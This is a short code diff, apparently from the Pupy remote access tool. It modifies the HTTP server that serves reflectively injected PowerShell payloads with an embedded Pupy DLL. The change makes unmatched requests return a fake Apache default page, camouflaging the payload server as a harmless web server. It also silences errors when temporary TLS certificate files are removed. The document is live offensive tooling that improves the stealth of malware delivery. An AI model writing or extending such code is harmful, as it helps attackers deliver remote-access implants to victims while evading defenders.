@@ -24,6 +24,11 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 url_random_one = "eiloShaegae1"
 url_random_two = "IMo8oosieVai"
 
+APACHE_DEFAULT_404="""<html><body><h1>It works!</h1>
+<p>This is the default web page for this server.</p>
+<p>The web server software is running but no content has been added, yet.</p>
+</body></html>"""
+
 def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
     '''
     Return source code of InvokeReflectivePEInjection.ps1 script with pupy dll embedded
@@ -119,8 +124,10 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
 
         else:
             self.send_response(404)
+            self.send_header('Content-type','text/html')
             self.end_headers()
-            return
+            self.wfile.write(APACHE_DEFAULT_404)
+
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     def set(self,conf, link_ip, port, ssl, useTargetProxy):
         self.payload_conf = conf
@@ -148,9 +155,11 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 
 
     def server_close(self):
-        print "here"
-        os.unlink(self.tmp_cert_path)
-        os.unlink(self.tmp_key_path)
+        try:
+            os.unlink(self.tmp_cert_path)
+            os.unlink(self.tmp_key_path)
+        except:
+            pass
         self.socket.close()
 
 def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=True, useTargetProxy=True):
